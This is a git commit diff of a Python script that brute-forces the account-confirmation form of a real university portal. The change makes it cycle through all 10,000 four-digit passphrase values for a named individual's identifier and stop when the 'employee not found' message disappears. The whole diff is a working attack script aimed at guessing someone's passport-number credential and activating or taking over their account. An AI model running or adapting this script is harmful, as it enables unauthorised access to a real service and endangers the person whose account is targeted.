3de3b57260eb96adf8fd0dc5200ef908b4282064
DaLLuZZ <79600653+DaLLuZZ@users.noreply.github.com>
2022-09-27 18:05:37 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -4,8 +4,8 @@ import requests
 def main():
     client = requests.Session()
 
-    passport = 3601
-    while passport < 3602:
+    passport = 0
+    while passport < 10000:
         print("\n\n\n\n\n\npassport: {}\n".format(passport))
 
         body = ""
@@ -19,10 +19,11 @@ def main():
             body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D={}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
 
         client = requests.post('https://lk.misis.ru/ru/auth/confirm', body)
-        if client.text.find("К сожалению нам не удалось найти сотрудника") == -1 or passport < 3602:
+        if client.text.find("К сожалению нам не удалось найти сотрудника") == -1 or passport < 1:
             print(client.text)
         if client.text.find("К сожалению нам не удалось найти сотрудника") == -1:
             print("\n\nfinal passport: {}".format(passport))
+            break;
 
         passport = passport + 1
 
